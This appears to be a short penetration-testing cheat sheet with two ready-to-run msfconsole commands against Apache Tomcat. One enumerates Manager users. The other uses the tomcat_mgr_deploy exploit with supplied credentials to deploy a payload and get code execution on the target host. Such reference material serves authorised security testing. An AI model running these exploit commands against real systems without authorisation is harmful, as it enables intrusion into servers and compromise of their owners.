# Tomcat

## metasploit

### Manager enum

Read manager enum with Tomcat.

```sh title:"Tomcat Read Manager Enum"
msfconsole -x "use auxiliary/scanner/http/tomcat_enum; set RHOSTS $rhost_ip; set RPORT $rport; run; exit"
```
<!-- cheat
var rhost_ip
var rport := 8080
-->

### Manager deploy

Read manager deploy with Tomcat.

```sh title:"Tomcat Read Manager Deploy"
msfconsole -x "use exploit/multi/http/tomcat_mgr_deploy; set RHOSTS $rhost_ip; set RPORT $rport; set USERNAME $user; set PASSWORD $pass; run; exit"
```
<!-- cheat
var rhost_ip
var rport := 8080
var user
var pass
-->
